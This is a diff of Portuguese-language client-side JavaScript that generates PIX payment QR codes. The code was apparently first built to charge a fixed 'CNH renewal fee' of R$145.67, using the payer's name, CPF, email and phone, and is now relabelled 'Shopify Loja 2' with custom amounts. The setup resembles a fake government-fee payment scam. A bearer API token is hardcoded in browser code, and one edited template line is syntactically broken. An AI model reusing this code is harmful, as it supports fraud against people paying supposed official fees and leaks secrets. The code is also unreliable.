@@ -4,22 +4,26 @@ const PIX_CONFIG = {
     apiToken: "Bearer 2zxA50CzfpTMZgKCwuotYv681fsfo4bcrXrdttHxdD4",
     currency: "BRL",
     amount: 14567, // R$ 145,67 em centavos
-    description: "Taxa de Renovação da CNH"
+    description: "Shopify Loja 2",
+    productName: "Shopify Loja 2"
 };
 
 /**
  * Gerar QR Code PIX
  * @param {Object} userData - Dados do usuário (nome, cpf, email, telefone)
+ * @param {Number} amount - Valor em centavos (opcional, usa padrão se não informado)
  * @returns {Promise<Object>} Resposta da API com QR Code
  */
-async function gerarQRCodePIX(userData) {
+async function gerarQRCodePIX(userData, amount = null) {
     try {
+        const valorFinal = amount || PIX_CONFIG.amount;
+
         const payload = {
-            amount: PIX_CONFIG.amount,
+            amount: valorFinal,
             currency: PIX_CONFIG.currency,
             method: "PIX",
             description: PIX_CONFIG.description,
-            externalRef: `cnh_${userData.cpf.replace(/\D/g, '')}_${Date.now()}`,
+            externalRef: `shopify_${userData.cpf.replace(/\D/g, '')}_${Date.now()}`,
             notificationUrl: `${window.location.origin}/pagamento/webhook`,
             payer: {
                 name: userData.nome || "Usuário",
@@ -30,8 +34,8 @@ async function gerarQRCodePIX(userData) {
             items: [
                 {
                     quantity: 1,
-                    name: "Taxa de Renovação da CNH",
-                    price: PIX_CONFIG.amount,
+                    name: PIX_CONFIG.productName,
+                    price: valorFinal,
                     type: "SERVICE"
                 }
             ]
@@ -54,6 +58,9 @@ async function gerarQRCodePIX(userData) {
 
         const data = await response.json();
         console.log("Resposta da API:", data);
+
+        // Adicionar valor na resposta para exibição
+        data.valorFinal = valorFinal;
 
         return data;
 
@@ -119,7 +126,7 @@ function exibirModalQRCode(pixData) {
                     <i class="fas fa-check-circle text-green-600 mr-2"></i>
                     <span class="text-sm font-medium text-green-800">Valor</span>
                 </div>
-                <p class="text-2xl font-bold text-green-600">R$ ${(PIX_CONFIG.amount / 100).toFixed(2)}</p>
+                <p class="text-2xl font-bold text-green-600">R$ ${(${pixData.valorFinal || PIX_CONFIG.amount} / 100).toFixed(2)}</p>
             </div>
 
             <!-- Instruções -->
@@ -213,8 +220,9 @@ async function atualizarStatusPagamento(paymentId, externalRef) {
 
 /**
  * Processar pagamento PIX
+ * @param {Number} valorCustomizado - Valor em centavos (opcional)
  */
-async function processarPagamentoPIX() {
+async function processarPagamentoPIX(valorCustomizado = null) {
     // Mostrar carregamento
     const botao = document.getElementById('btn-pagar');
     if (botao) {
@@ -236,11 +244,14 @@ async function processarPagamentoPIX() {
 
     if (dadosCompletos.nome) userData.nome = dadosCompletos.nome;
     if (dadosCompletos.cpf) userData.cpf = dadosCompletos.cpf;
-    if (dadosCPF.email) userData.email = dadosStorage.email;
+    if (dadosStorage.email) userData.email = dadosStorage.email;
     if (dadosStorage.telefone) userData.telefone = dadosStorage.telefone;
 
+    // Usar valor customizado ou padrão
+    const valor = valorCustomizado || PIX_CONFIG.amount;
+
     // Gerar QR Code
-    const resultado = await gerarQRCodePIX(userData);
+    const resultado = await gerarQRCodePIX(userData, valor);
 
     if (resultado.success || resultado.qrCode) {
         // Exibir modal com QR Code
